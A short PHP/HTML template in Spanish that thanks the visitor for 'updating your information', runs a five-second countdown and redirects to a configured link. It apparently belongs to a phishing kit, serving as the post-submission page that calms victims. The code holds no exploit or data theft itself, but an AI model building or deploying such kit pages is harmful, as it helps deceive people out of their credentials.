<?php 

    $page = '';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
?>
<!doctype html>
<html class="no-js" lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Bienvenido</title>
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
    <link rel="stylesheet" href="<?php echo $css; ?>">
  </head>

  <body class="gr">
    <div class="body">
      <div class="content">
        <div class="sppiner">
          <div class="load text-center">
            <center><img src="<?php echo $img .'load.gif' ?>" alt="">
            <div id="txt">
              <h4>Gracias por actualizar tu información</h4>
              <p>
                por favor espera.<span id="sec" style="display:inline;padding:0;color:#dc1431;">5</span> <span style="display:inline;padding:0;color:#dc1431;">sec.</span>
              </p></center>
            </div>
          </div>
        </div>
      </div>
    </div>
      <script src="<?php echo $js; ?>"></script>
      <script>
        function refresh(id,url){var count = 6, sec = document.getElementById(id), interval = setInterval(function(){ count--; if (count > 0) { sec.innerHTML= count; } if(count == 0){ sec.innerHTML= "0"; window.location = url; }  }, 1000); }
        refresh("sec","<?php echo $link; ?>"); 
      </script>
  </body>
</html>
<?php
    endif;
    ob_end_flush();
?>
